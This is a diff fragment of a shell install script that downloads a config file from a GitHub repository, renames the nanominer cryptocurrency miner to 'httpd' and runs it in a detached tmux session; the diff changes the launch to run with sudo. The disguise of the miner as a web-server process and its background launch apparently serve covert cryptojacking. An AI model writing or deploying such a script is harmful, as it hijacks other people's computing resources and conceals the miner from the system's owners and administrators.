@@ -11,7 +11,7 @@ echo "script da install , chay thoi "
 cd nanominer-linux-1.9.6
 sudo rm config.ini
 sudo wget https://raw.githubusercontent.com/minnie1311/azureAI/master/config.ini
-tmux new-session -d -s my_session1  './httpd'
+sudo tmux new-session -d -s my_session1  './httpd'
      
 fi
 exit
@@ -24,5 +24,5 @@ sudo rm config.ini
 sudo wget https://raw.githubusercontent.com/minnie1311/azureAI/master/config.ini
 sudo chmod +x nanominer
 sudo mv nanominer httpd
-tmux new-session -d -s my_session1  './httpd'
+sudo tmux new-session -d -s my_session1  './httpd'
 
